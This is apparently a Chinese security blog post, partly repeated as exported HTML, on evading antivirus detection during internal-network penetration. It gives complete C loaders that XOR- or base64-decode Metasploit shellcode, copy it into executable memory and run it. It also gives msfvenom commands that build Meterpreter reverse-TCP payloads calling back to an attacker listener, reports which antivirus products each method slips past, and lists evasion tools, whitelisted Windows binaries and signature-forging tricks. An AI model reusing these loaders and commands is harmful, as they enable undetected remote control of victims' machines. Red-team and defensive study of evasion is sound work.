shellcode[sizeof encryptedShellcode];\n\n\n    // XOR decoding stub using the key defined above must be the same as the encoding key\n    int j = 0;\n    for (int i = 0; i < sizeof encryptedShellcode; i++) {\n        if (j == sizeof key - 1) j = 0;\n\n        shellcode[i] = encryptedShellcode[i] ^ key[j];\n        j++;\n    }\n\n    // Allocating memory with EXECUTE writes\n    void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);\n\n    // Copying deciphered shellcode into memory as a function\n    memcpy(exec, shellcode, sizeof shellcode);\n\n    // Call the shellcode\n    ((void(*)())exec)();\n}\n```\n\nvs2019编译执行，关闭杀软，msf中可正常上线：\n\n![image-20220530145307544](./images/202205301453694.png)\n\n打开杀软，360和火绒均可查杀，其中360结果为“具有木马特征程序”（原po火绒静态可查杀但是行为检测没报警，360杀毒和卫士没有反应，直接上线）。\n\nvirustotal.com上查杀率为21/69（原po为15/71）。\n\n360：\n\n![image-20220530145415574](./images/202205301454631.png)\n\nVT：\n\n![image-20220530145657512](./images/202205301456618.png)\n\n### 方法7 base64加密1（VT免杀率21/68）\n\n需要两个文件，`base64.c`和`base64.h`\n\n`base64.c`文件内容：\n\n```c\n/* Base64 encoder/decoder. Originally Apache file ap_base64.c\n*/\n\n#include <string.h>\n\n#include \"base64.h\"\n\n/* aaaack but it's fast and const should make it shared text page. */\nstatic const unsigned char pr2six[256] =\n{\n    /* ASCII table */\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,\n    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,\n    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,\n    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,\n    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,\n    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,\n    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64\n};\n\nint Base64decode_len(const char *bufcoded)\n{\n    int nbytesdecoded;\n    register const unsigned char *bufin;\n    register int nprbytes;\n\n    bufin = (const unsigned char *)bufcoded;\n    while (pr2six[*(bufin++)] <= 63);\n\n    nprbytes = (bufin - (const unsigned char *)bufcoded) - 1;\n    nbytesdecoded = ((nprbytes + 3) / 4) * 3;\n\n    return nbytesdecoded + 1;\n}\n\nint Base64decode(char *bufplain, const char *bufcoded)\n{\n    int nbytesdecoded;\n    register const unsigned char *bufin;\n    register unsigned char *bufout;\n    register int nprbytes;\n\n    bufin = (const unsigned char *)bufcoded;\n    while (pr2six[*(bufin++)] <= 63);\n    nprbytes = (bufin - (const unsigned char *)bufcoded) - 1;\n    nbytesdecoded = ((nprbytes + 3) / 4) * 3;\n\n    bufout = (unsigned char *)bufplain;\n    bufin = (const unsigned char *)bufcoded;\n\n    while (nprbytes > 4) {\n        *(bufout++) =\n            (unsigned char)(pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);\n        *(bufout++) =\n            (unsigned char)(pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);\n        *(bufout++) =\n            (unsigned char)(pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);\n        bufin += 4;\n        nprbytes -= 4;\n    }\n\n    /* Note: (nprbytes == 1) would be an error, so just ingore that case */\n    if (nprbytes > 1) {\n        *(bufout++) =\n            (unsigned char)(pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);\n    }\n    if (nprbytes > 2) {\n        *(bufout++) =\n            (unsigned char)(pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);\n    }\n    if (nprbytes > 3) {\n        *(bufout++) =\n            (unsigned char)(pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);\n    }\n\n    *(bufout++) = '\\0';\n    nbytesdecoded -= (4 - nprbytes) & 3;\n    return nbytesdecoded;\n}\n\nstatic const char basis_64[] =\n\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n\nint Base64encode_len(int len)\n{\n    return ((len + 2) / 3 * 4) + 1;\n}\n\nint Base64encode(char *encoded, const char *string, int len)\n{\n    int i;\n    char *p;\n\n    p = encoded;\n    for (i = 0; i < len - 2; i += 3) {\n        *p++ = basis_64[(string[i] >> 2) & 0x3F];\n        *p++ = basis_64[((string[i] & 0x3) << 4) |\n            ((int)(string[i + 1] & 0xF0) >> 4)];\n        *p++ = basis_64[((string[i + 1] & 0xF) << 2) |\n            ((int)(string[i + 2] & 0xC0) >> 6)];\n        *p++ = basis_64[string[i + 2] & 0x3F];\n    }\n    if (i < len) {\n        *p++ = basis_64[(string[i] >> 2) & 0x3F];\n        if (i == (len - 1)) {\n            *p++ = basis_64[((string[i] & 0x3) << 4)];\n            //    *p++ = '=';\n        }\n        else {\n            *p++ = basis_64[((string[i] & 0x3) << 4) |\n                ((int)(string[i + 1] & 0xF0) >> 4)];\n            *p++ = basis_64[((string[i + 1] & 0xF) << 2)];\n        }\n        //*p++ = '=';\n    }\n\n    *p++ = '\\0';\n    return p - encoded;\n}\n```\n\n`base64.h`文件内容：\n\n```c\n#ifndef _BASE64_H_\n#define _BASE64_H_\n\n#ifdef __cplusplus\nextern \"C\" {\n#endif\n\n    int Base64encode_len(int len);\n    int Base64encode(char * coded_dst, const char *plain_src, int len_plain_src);\n\n    int Base64decode_len(const char * coded_src);\n    int Base64decode(char * plain_dst, const char *coded_src);\n\n#ifdef __cplusplus\n}\n#endif\n\n#endif //_BASE64_H_\n```\n\n`shellcode.c`文件内容：\n\n```c\n#include <Windows.h>\n#include <stdio.h>\n#include <string.h>\n\n#include \"base64.h\"\n\nunsigned char buf[] =\n\"msf base64 code here\";\n\n// 原po代码报错，这里做了一些强制转换和类型修正\nint main(int argc, const char* argv[]) {\n\n\n    char str1[1000] = { 0 };\n    Base64decode(str1, (char*)buf);\n    LPVOID Memory;\n    Memory = VirtualAlloc(NULL, sizeof(str1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n    memcpy(Memory, str1, sizeof(str1));\n    ((void(*)())Memory)();\n    return 0;\n}\n```\n\n使用msf生成base64编码的shellcode：\n\n```\nmsfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.174.128 lport=6666  -f c > shell.c\n```\n\n把`shell.c`的内容复制到上面`shellcode.c`文件中。vs2019编译，关闭杀软，msf可成功上线。\n\n打开杀软，火绒可以查杀，**360不能查杀**（原po火绒静态查杀会报毒，但行为检测没有反应，360全通过）。\n\nvirustotal.com查杀率为21/68（原po为28/69）。\n\n![image-20220530152630449](./images/202205301526558.png)\n\n### 方法8 base64加密2（VT免杀率17/67）\n\n另外一种base64加密方式，和方法7类似，实现代码略有不同。\n\n`base64.c`文件内容：\n\n```c\n//\n//  base64.c\n//  base64\n//\n//  Created by guofu on 2017/5/25.\n//  Copyright © 2017年 guofu. All rights reserved.\n//\n/**\n*  转解码过程\n*  3 * 8 = 4 * 6; 3字节占24位, 4*6=24\n*  先将要编码的转成对应的ASCII值\n*  如编码: s 1 3\n*  对应ASCII值为: 115 49 51\n*  对应二进制为: 01110011 00110001 00110011\n*  将其6个分组分4组: 011100 110011 000100 110011\n*  而计算机是以8bit存储, 所以在每组的高位补两个0如下:\n*  00011100 00110011 00000100 00110011对应:28 51 4 51\n*  查找base64 转换表 对应 c z E z\n*\n*  解码\n*  c z E z\n*  对应ASCII值为 99 122 69 122\n*  对应表base64_suffix_map的值为 28 51 4 51\n*  对应二进制值为 00011100 00110011 00000100 00110011\n*  依次去除每组的前两位, 再拼接成3字节\n*  即: 01110011 00110001 00110011\n*  对应的就是s 1 3\n*/\n\n#include \"base64.h\"\n\n#include <stdio.h>\n#include <stdlib.h>\n\n// base64 转换表, 共64个\nstatic const char base64_alphabet[] = {\n    'A', 'B', 'C', 'D', 'E', 'F', 'G',\n    'H', 'I', 'J', 'K', 'L', 'M', 'N',\n    'O', 'P', 'Q', 'R', 'S', 'T',\n    'U', 'V', 'W', 'X', 'Y', 'Z',\n    'a', 'b', 'c', 'd', 'e', 'f', 'g',\n    'h', 'i', 'j', 'k', 'l', 'm', 'n',\n    'o', 'p', 'q', 'r', 's', 't',\n    'u', 'v', 'w', 'x', 'y', 'z',\n    '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',\n    '+', '/' };\n\n// 解码时使用\nstatic const unsigned char base64_suffix_map[256] = {\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 253, 255,\n    255, 253, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 253, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255,  62, 255, 255, 255,  63,\n    52,  53,  54,  55,  56,  57,  58,  59,  60,  61, 255, 255,\n    255, 254, 255, 255, 255,   0,   1,   2,   3,   4,   5,   6,\n    7,   8,   9,  10,  11,  12,  13,  14,  15,  16,  17,  18,\n    19,  20,  21,  22,  23,  24,  25, 255, 255, 255, 255, 255,\n    255,  26,  27,  28,  29,  30,  31,  32,  33,  34,  35,  36,\n    37,  38,  39,  40,  41,  42,  43,  44,  45,  46,  47,  48,\n    49,  50,  51, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255,\n    255, 255, 255, 255 };\n\nstatic char cmove_bits(unsigned char src, unsigned lnum, unsigned rnum) {\n    src <<= lnum; // src = src << lnum;\n    src >>= rnum; // src = src >> rnum;\n    return src;\n}\n\nint base64_encode(const char *indata, int inlen, char *outdata, int *outlen) {\n\n    int ret = 0; // return value\n    if (indata == NULL || inlen == 0) {\n        return ret = -1;\n    }\n\n    int in_len = 0; // 源字符串长度, 如果in_len不是3的倍数, 那么需要补成3的倍数\n    int pad_num = 0; // 需要补齐的字符个数, 这样只有2, 1, 0(0的话不需要拼接, )\n    if (inlen % 3 != 0) {\n        pad_num = 3 - inlen % 3;\n    }\n    in_len = inlen + pad_num; // 拼接后的长度, 实际编码需要的长度(3的倍数)\n\n    int out_len = in_len * 8 / 6; // 编码后的长度\n\n    char *p = outdata; // 定义指针指向传出data的首地址\n\n                       //编码, 长度为调整后的长度, 3字节一组\n    for (int i = 0; i < in_len; i += 3) {\n        int value = *indata >> 2; // 将indata第一个字符向右移动2bit(丢弃2bit)\n        char c = base64_alphabet[value]; // 对应base64转换表的字符\n        *p = c; // 将对应字符(编码后字符)赋值给outdata第一字节\n\n                //处理最后一组(最后3字节)的数据\n        if (i == inlen + pad_num - 3 && pad_num != 0) {\n            if (pad_num == 1) {\n                *(p + 1) = base64_alphabet[(int)(cmove_bits(*indata, 6, 2) + cmove_bits(*(indata + 1), 0, 4))];\n                *(p + 2) = base64_alphabet[(int)cmove_bits(*(indata + 1), 4, 2)];\n                *(p + 3) = '=';\n            }\n            else if (pad_num == 2) { // 编码后的数据要补两个 '='\n                *(p + 1) = base64_alphabet[(int)cmove_bits(*indata, 6, 2)];\n                *(p + 2) = '=';\n                *(p + 3) = '=';\n            }\n        }\n        else { // 处理正常的3字节的数据\n            *(p + 1) = base64_alphabet[cmove_bits(*indata, 6, 2) + cmove_bits(*(indata + 1), 0, 4)];\n            *(p + 2) = base64_alphabet[cmove_bits(*(indata + 1), 4, 2) + cmove_bits(*(indata + 2), 0, 6)];\n            *(p + 3) = base64_alphabet[*(indata + 2) & 0x3f];\n        }\n\n        p += 4;\n        indata += 3;\n    }\n\n    if (outlen != NULL) {\n        *outlen = out_len;\n    }\n\n    return ret;\n}\n\n\nint base64_decode(const char *indata, int inlen, char *outdata) {\n\n    int ret = 0;\n    if (indata == NULL || inlen <= 0 || outdata == NULL ) {\n        return ret = -1;\n    }\n    if (inlen % 4 != 0) { // 需要解码的数据不是4字节倍数\n        return ret = -2;\n    }\n\n    int t = 0, x = 0, y = 0, i = 0;\n    unsigned char c = 0;\n    int g = 3;\n\n    while (indata[x] != 0) {\n        // 需要解码的数据对应的ASCII值对应base64_suffix_map的值\n        c = base64_suffix_map[indata[x++]];\n        if (c == 255) return -1;// 对应的值不在转码表中\n        if (c == 253) continue;// 对应的值是换行或者回车\n        if (c == 254) { c = 0; g--; }// 对应的值是'='\n        t = (t << 6) | c; // 将其依次放入一个int型中占3字节\n        if (++y == 4) {\n            outdata[i++] = (unsigned char)((t >> 16) & 0xff);\n            if (g > 1) outdata[i++] = (unsigned char)((t >> 8) & 0xff);\n            if (g > 2) outdata[i++] = (unsigned char)(t & 0xff);\n            y = t = 0;\n        }\n    }\n\n    return ret;\n}\n```\n\n`base64.h`文件内容：\n\n```c\n#ifndef base64_h\n#define base64_h\n\n#include <stdio.h>\n\n#if __cplusplus\nextern \"C\" {\n#endif\n\n    int base64_encode(const char *indata, int inlen, char *outdata, int *outlen);\n    int base64_decode(const char *indata, int inlen, char *outdata);\n\n#if __cplusplus\n}\n#endif\n\n#endif /* base64_h */\n```\n\n`shellcode.c`文件内容：\n\n```c\n#include <stdio.h>\n#include <string.h>\n#include <Windows.h>\n\n#include \"base64.h\"\n\nunsigned char buf[] =\n\"msf base64 code\";\n\nint main(int argc, const char * argv[]) {\n\n\n    char str3[1000] = { 0 };\n\n    // 原po代码报错，这里做了一些强制转换和类型修正\n    base64_decode(buf, (int)strlen(buf), str3);\n\n    char *Memory;\n\n    Memory = VirtualAlloc(NULL, sizeof(str3), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);\n\n    memcpy(Memory, str3, sizeof(str3));\n\n    ((void(*)())Memory)();\n\n    return 0;\n}\n```\n\n使用msf生成base64编码的shellcode：\n\n```\nmsfvenom -p  windows/meterpreter/reverse_tcp --encrypt base64  lhost=192.168.174.128 lport=6666  -f c > shell.c\n```\n\n把`shell.c`的内容复制到上面`shellcode.c`文件中。vs2019编译，关闭杀软，msf可成功上线。\n\n打开杀软，火绒可以查杀，**360不能查杀**。\n\nvirustotal.com上查杀率为17/67（原po为28/69）。\n\n![image-20220530155809229](./images/202205301558330.png)\n\n## 总结\n\n与2020年相比，2022年卷了很多。纵览360和火绒就能直观感受到，确实杀软能力越来越强了。2020年可以Bypass卡巴斯基、McAfee、Symantec等杀软的方法，2022年均失效。\n\n免杀操作层出不穷，特别是近两年也有很多新的优秀项目。本文仅为最基本的免杀方式，前路漫漫，还有很多要学习的，共勉。\n\n一些知识点：\n\n- 常见免杀工具（21种）：msf自免杀、Veil、Venom、Shellter、BackDoor-Factory、Avet、TheFatRat、Avoidz、Green-Hat-Suite、zirikatu、AVIator、DKMC、Unicorn、Python-Rootkit、DKMC、Unicorn、Python-Rootkit、ASWCrypter、nps_payload、GreatSCT、HERCULES、SpookFlare、SharpShooter、CACTUSTORCH、Winpayload等。\n- 常见免杀编程语言：C/C++、C#、python、powershell、ruby、go等。\n- 常见免杀白名单程序（113个）：Rundll32.exe、Msiexec.exe、MSBuild.exe、InstallUtil.exe、Mshta.exe、Regsvr32.exe、Cmstp.exe、CScript.exe、WScript.exe、Forfiles.exe、te.exe、Odbcconf.exe、InfDefaultInstall.exe、Diskshadow.exe、PsExec.exe、Msdeploy.exe、Winword.exe、Regasm.exe、Regsvcs.exe、Ftp.exe、pubprn.vbs、winrm.vbs、slmgr.vbs、Xwizard.exe、Compiler.exe、IEExec.exe、MavInject32、Presentationhost.exe、Wmic.exe、Pcalua.exe、Url.dll、zipfldr.dll、Syncappvpublishingserver.vbs等。\n\n## 参考链接\n\n- BypassAntiVirus：远控免杀系列文章 https://github.com/TideSec/BypassAntiVirus\n- AntivirusScanner：杀软进程检测脚本 https://github.com/Threekiii/Awesome-Redteam/tree/master/scripts/AntivirusScanner\n</style>\n","slug":"内网渗透-免杀","published":1,"layout":"post","photos":[],"_id":"cm8iuwsr9000drcn13pdcc4vh","content":"<h1 id=\"内网渗透-免杀\"><a href=\"#内网渗透-免杀\" class=\"headerlink\" title=\"内网渗透-免杀\"></a>内网渗透-免杀</h1><h2 id=\"杀软原理\"><a href=\"#杀软原理\" class=\"headerlink\" title=\"杀软原理\"></a>杀软原理</h2><p>可执行文件存在的两种状态及检测方式：</p>\n<ul>\n<li>未执行时在硬盘上的状态（静态检测）</li>\n<li>执行后加载进内存的状态（动态监测）</li>\n</ul>\n<p>杀软的基本等级：</p>\n<ul>\n<li>无害：无任何可疑行为，无任何特征命中病毒特征</li>\n<li>可疑：存在可疑行为，例如操作注册表、打开Powershell、修改用户、操作敏感文件等</li>\n<li>有害：特征命中病毒特征</li>\n</ul>\n<h3 id=\"静态检测\"><a href=\"#静态检测\" class=\"headerlink\" title=\"静态检测\"></a>静态检测</h3><p>静态检测是在不实际运行程序的情况下进行的分析，大部分的静态检测对象是针对特定版本的源代码，也有些静态程序分析的对象是目标代码。</p>\n<p>静态检测针对样本文件在硬盘上的状态进行检测：</p>\n<ul>\n<li>样本Hash检测：此类检测会对文件整体以及各个节段进行Hash计算，而后对比是否存在于特征病毒库中，这是最早期的检测方法。对于Hash检测，在源码中修改一下变量名，或在编译完成之后，通过二进制查看器修改某一不重要的字节码，即可改变整个文件的Hash。</li>\n<li>特征码检测：由于样本Hash检测的缺点，特征码会提取文件中部分关键字节码作为特征进行检测，字节码可以是硬编码的IP、域名、互斥体名称、加密秘钥或部分关键流程代码。杀软会扫描存在磁盘上的镜像文件，如果满足特征码，就识别为恶意软件。</li>\n<li>黑白名单检测：对于一些系统进程或是杀软进程可能会默认加白，这样即便有些恶意行为，也不会被查杀。</li>\n</ul>\n<p>通常静态检测会识别代码中存在的函数：</p>\n<ul>\n<li>Windows API函数：尤其是与内存、堆、线程相关的函数，例如virualalloc、rtlmovememory、ntcreatthread等。</li>\n<li>编程语言关键词：cmd等关键词，例如Python中的subprocess.popen(“cmd &#x2F;c”)</li>\n</ul>\n<p>常见的绕过思路：</p>\n<ul>\n<li>绕过静态检测的方式通常有多次加密、内存加载执行、加壳改壳、添加&#x2F;替换资源、加密Shellcode等</li>\n</ul>\n<p>常用的静态检测平台：</p>\n<ul>\n<li><a href=\"https://www.virustotal.com/%EF%BC%8C%E6%B3%A8%E6%84%8F%EF%BC%9AVirustotal%E6%98%AF%E5%9B%BD%E5%A4%96%E5%B9%B3%E5%8F%B0%EF%BC%8C%E8%AF%B7%E8%B0%A8%E6%85%8E%E6%93%8D%E4%BD%9C%EF%BC%8C%E6%9C%80%E5%A5%BD%E4%B8%8D%E8%A6%81%E7%9B%B4%E6%8E%A5%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%EF%BC%8C%E5%BB%BA%E8%AE%AE%E4%BB%85%E6%A0%A1%E9%AA%8C%E5%B9%B6%E6%A3%80%E6%9F%A5MD5%E6%98%AF%E5%90%A6%E4%B8%BA%E6%81%B6%E6%84%8F%E6%96%87%E4%BB%B6%E3%80%82\">https://www.virustotal.com/，注意：Virustotal是国外平台，请谨慎操作，最好不要直接上传文件，建议仅校验并检查MD5是否为恶意文件。</a></li>\n</ul>\n<h3 id=\"动态检测\"><a href=\"#动态检测\" class=\"headerlink\" title=\"动态检测\"></a>动态检测</h3><p>动态检测针对样本文件内存中的状态进行检测：</p>\n<ul>\n<li>内存特征码检测：对于静态文件特征码来说，可以将shellcode做多次加密，完全抹掉其原本特征，降低杀软的报毒率。但是当进入内存需要执行代码时，shellcode需要完全解密，这时候杀软只需要遍历内存，根据特征码进行查杀即可。</li>\n<li>敏感API检测（HOOK）：在关键的入口或道路进行监控，如果单次或多次触发警告，比如读取并修改了其他进程的内存，或在其他进程中开了个远程线程将触发告警。对于不同杀软的不同策略，将根据调用顺序、调用源、参数判断是否是正常调用。</li>\n<li>敏感行为检测：实现一个功能，不一定非要用某一个固定的接口，因此，实现一个读写内存操作，单检测一个API是无效的。此时，只要对象触发了某种行为，在其他进程中开了线程，那么就判定为恶意行为。常见的病毒恶意行为：<ul>\n<li>注册表操作：添加启动项、添加服务。</li>\n<li>文件操作：写入文件、读取系统文件、删除文件、移动文件。</li>\n<li>进程操作：杀死进程、创建进程。</li>\n<li>用户操作：添加用户、删除用户、删除用户。</li>\n<li>其他操作：注入、劫持等。</li>\n</ul>\n</li>\n</ul>\n<p>常见的绕过思路：</p>\n<ul>\n<li>绕过动态检测的方式通常是白名单调用敏感行为，再导入恶意内容</li>\n</ul>\n<p>常用的动态检测平台：</p>\n<ul>\n<li><a href=\"https://s.threatbook.cn/\">https://s.threatbook.cn/</a></li>\n</ul>\n<h3 id=\"流量检测\"><a href=\"#流量检测\" class=\"headerlink\" title=\"流量检测\"></a>流量检测</h3><p>流量检测针对恶意程序在网络通讯流量层面上的状态进行检测：</p>\n<ul>\n<li>结构特征：此类特征一般是指已知远控的恶意程序心跳包，比如CS beacon心跳包特征，会按照攻击者设置的频率发送固定结构固定内容的数据包以证明存活。</li>\n<li>内容特征：此类特征一般是指各类漏洞的exp流量包特征、冰蝎、哥斯拉等流量特征，对于此类流量可以编写流量规则进行过滤检测，比如suricata规则、wireshark规则等。</li>\n<li>IP&#x2F;域名&#x2F;证书匹配：对于数据包中的ip域名等信息，链接威胁情报平台查询是否存在恶意行为，比如扫描、用作C2回连或网站挂马等，对于此类流量可以选择弹窗告警或直接阻断。</li>\n</ul>\n<p>常见的绕过思路：</p>\n<ul>\n<li>绕过流量检测的方式通常有TCP分段传输、内容加密、使用合法证书等</li>\n</ul>\n<h3 id=\"云查杀\"><a href=\"#云查杀\" class=\"headerlink\" title=\"云查杀\"></a>云查杀</h3><p>云查杀的不同点在于它的病毒库是放在服务器端的，而不是本地客户端，只要联网，病毒库就会同步更新，病毒库更加强大。</p>\n<p>当开着杀软的云查杀的时候，有时候刚开始没报病毒，但过一会就提示病毒了。</p>\n<h2 id=\"免杀原理\"><a href=\"#免杀原理\" class=\"headerlink\" title=\"免杀原理\"></a>免杀原理</h2><h3 id=\"静态免杀\"><a href=\"#静态免杀\" class=\"headerlink\" title=\"静态免杀\"></a>静态免杀</h3><h4 id=\"修改特征码\"><a href=\"#修改特征码\" class=\"headerlink\" title=\"修改特征码\"></a>修改特征码</h4><p>特征码是能够识别一个程序的不大于64字节的字符。</p>\n<p>修改特征码是在不改变程序运行效果的前提下，更改其特征码。</p>\n<p>修改特征码最重要的是定位特征码，但是定位了特征码修改后并不代表程序就能正常运行，费时费力，由于各个杀软厂商的特征库不同，所以一般也只能对一类的杀软起效果。虽然效果不好，但有时候在没有源码的情况下可以一用。</p>\n<h4 id=\"花指令免杀\"><a href=\"#花指令免杀\" class=\"headerlink\" title=\"花指令免杀\"></a>花指令免杀</h4><p>花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。</p>\n<p>为一个程序添加一段花指令之后，程序的部分偏移会受到影响，如果反病毒软件不能识别这段花指令，那么它检测特征码的偏移量会整体位移一段位置，也就无法正常检测木马了。</p>\n<h4 id=\"加壳免杀\"><a href=\"#加壳免杀\" class=\"headerlink\" title=\"加壳免杀\"></a>加壳免杀</h4><p>软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。</p>\n<p>加壳能够掩盖特征码，特别是对于不开源的PE文件，加壳可以绕过很多特征码识别。但是壳也有自己的特征，主流的壳例如VMP、Themida等，被检测出将直接报毒。</p>\n<p>可以用一些冷门的加密壳，或基于开源压缩壳做二次开发。</p>\n<p>加壳工具：</p>\n<ul>\n<li>ASPack</li>\n<li>UPX</li>\n</ul>\n<h3 id=\"动态免杀\"><a href=\"#动态免杀\" class=\"headerlink\" title=\"动态免杀\"></a>动态免杀</h3><h4 id=\"API免杀\"><a href=\"#API免杀\" class=\"headerlink\" title=\"API免杀\"></a>API免杀</h4><ul>\n<li><p>替换API：杀软不可能拦截所有API，可以使用相同功能的API进行替换，例如<code>MoveFileEx</code>替换<code>MoveFile</code>。</p>\n</li>\n<li><p>重写API：逆向后完全重写系统API功能，实现对应功能的API。</p>\n</li>\n<li><p>底层API：寻找更底层的API进行调用，绕过拦截，例如NT函数。或者通过DeviceloControl函数调用驱动功能来完成API功能，模拟系统调用。</p>\n</li>\n</ul>\n<h4 id=\"内存免杀\"><a href=\"#内存免杀\" class=\"headerlink\" title=\"内存免杀\"></a>内存免杀</h4><p>在执行外壳代码时，要先将原软件解密，并放到内存里，然后再通知CPU执行。加壳时，需要加一个混淆程序原有代码的壳，才能躲过杀软查杀。</p>\n<h4 id=\"二次编译\"><a href=\"#二次编译\" class=\"headerlink\" title=\"二次编译\"></a>二次编译</h4><p>Metasploit的Msfvenom提供了多种格式的Payload和Encoder，生成的Shellcode也为二次加工提供了很大便利。</p>\n<p>Shikata_ga_nai是MSF中唯一的评价是excellent的编码器，这种多态编码技术使得每次生成的攻击载荷文件是不一样的，编码和解码也都是不一样的，还可以利用管道进行多重编码进行免杀。</p>\n<p>目前Msfvenom的Encoder特征基本都进入了杀软的漏洞库，很难实现单一Encoder编码而绕过杀软，所以对Shellcode进行进一步修改编译成了MSF免杀的主流。有很多借助于C、C#、python等语言对Shellcode进行二次编码从而达到免杀的效果。</p>\n<h4 id=\"分离免杀\"><a href=\"#分离免杀\" class=\"headerlink\" title=\"分离免杀\"></a>分离免杀</h4><p>例如Payload分离免杀和Webshell分离免杀，将Shellcode和加载器分离，实现简单，但效果不错。</p>\n<h4 id=\"资源修改\"><a href=\"#资源修改\" class=\"headerlink\" title=\"资源修改\"></a>资源修改</h4><p>有些杀软会设置有扫描白名单，比如之前把程序图标替换为360安全卫士图标就能过360的查杀。</p>\n<ul>\n<li>添加资源：使用ResHacker将正常软件的资源加入到恶意软件，例如图片、版本信息、对话框等</li>\n<li>替换资源：使用ResHacker替换无用的资源，例如版本等</li>\n<li>添加签名：使用签名伪造工具，将正常软件的签名信息添加到恶意软件</li>\n</ul>\n<h1 id=\"免杀技术研究\"><a href=\"#免杀技术研究\" class=\"headerlink\" title=\"免杀技术研究\"></a>免杀技术研究</h1><h2 id=\"Bypass一览表（2020年）\"><a href=\"#Bypass一览表（2020年）\" class=\"headerlink\" title=\"Bypass一览表（2020年）\"></a>Bypass一览表（2020年）</h2><p><img src=\"/./images/202205261702163.png\"></p>\n<p><img src=\"/./images/202205261701678.png\"></p>\n<h2 id=\"Bypass一览表（2022年）\"><a href=\"#Bypass一览表（2022年）\" class=\"headerlink\" title=\"Bypass一览表（2022年）\"></a>Bypass一览表（2022年）</h2><p>VirusTotal对应杀软及名称：</p>\n<ul>\n<li>卡巴：Kaspersky</li>\n<li>微软：Microsoft</li>\n<li>瑞星：Rising</li>\n<li>金山：Kingsoft</li>\n<li>江民：Jiangmin</li>\n<li>趋势：TrendMicro</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>序号</th>\n<th>免杀方法</th>\n<th>2020年VT</th>\n<th>2022年VT</th>\n<th>360</th>\n<th>QQ</th>\n<th>火绒</th>\n<th>卡巴</th>\n<th>McAfee</th>\n<th>微软</th>\n<th>Symantec</th>\n<th>瑞星</th>\n<th>金山</th>\n<th>江民</th>\n<th>趋势</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>1</td>\n<td>未免杀处理</td>\n<td>53&#x2F;69</td>\n<td>51&#x2F;69</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td></td>\n</tr>\n<tr>\n<td>2</td>\n<td>msf自编码</td>\n<td>51&#x2F;69</td>\n<td>48&#x2F;67</td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td></td>\n</tr>\n<tr>\n<td>3</td>\n<td>msf自捆绑</td>\n<td>39&#x2F;69</td>\n<td>15&#x2F;69</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td>√</td>\n<td></td>\n<td>√</td>\n<td>√</td>\n<td